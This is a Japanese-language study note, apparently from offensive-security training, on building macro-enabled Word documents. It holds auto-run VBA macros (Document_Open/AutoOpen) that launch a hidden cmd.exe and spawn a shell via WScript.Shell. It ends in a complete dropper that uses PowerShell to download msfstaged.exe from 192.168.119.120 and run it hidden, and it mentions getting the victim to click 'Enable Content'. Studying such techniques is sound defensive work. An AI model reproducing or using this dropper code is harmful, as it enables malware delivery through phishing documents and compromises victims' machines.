## マクロ付き文書作成方法
新しい文書を作成し、View->Macrosを選択
![[images/Pasted image 20260603000309.png]]

ドロップダウンメニューから、現在使用している文書を選択する必要がある
マクロの名前を指定してCreateを選択すると、VBAエディタが起動する
![[../../Pasted image 20260603000334.png]]

ドキュメント開いたらメッセージボックスが開くVBA
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

文書を.doc形式（ Word 97-2003 Document）で保存。開くとセキュリティ警告バナーがでてくるが、「Enable Content」をクリックするとマクロが実行される

cmdを実行するマクロ
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

WSHを使用してシェルを起動するマクロ
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

### マクロ実行が実行されるための設定
Trust Center設定へ行く
![[images/Pasted image 20260603001810.png]]

## PowershellをVBA上で動作させる
PowerShellダウンロードをVBAコードから呼び出す（実行ファイルをダウンロード）
```vb
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

VBA を介して実行ファイルを実行するには、完全なパスを指定する必要有
```vb
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```

ダウンロードは時間がかかるから、時間遅延（スリープ等）を設ける必要有
日付を使用したVBA待機メソッド
```vb
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

Dropper例
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

